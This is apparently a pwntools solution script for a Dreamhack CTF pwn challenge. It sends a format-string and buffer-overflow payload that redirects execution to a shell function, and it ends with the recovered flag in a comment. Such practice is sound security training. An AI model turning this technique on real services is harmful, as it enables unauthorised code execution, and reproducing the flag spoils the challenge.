from pwn import *

# p = process("./basic_exploitation_003")
p = remote("host1.dreamhack.games",8478)

shell = 0x8048669

payload = "" 

payload += "a"*0x30
payload += "%x"*12 
#%x -> 4byte char type -> 8 length number -> 8byte memory => 8*12 = 0x60bytes
payload += "b"*0xc
payload += p32(shell)



pause()

p.sendline(payload)

p.interactive()
#DH{4e6e355c62249b2da3b566f0d575007e}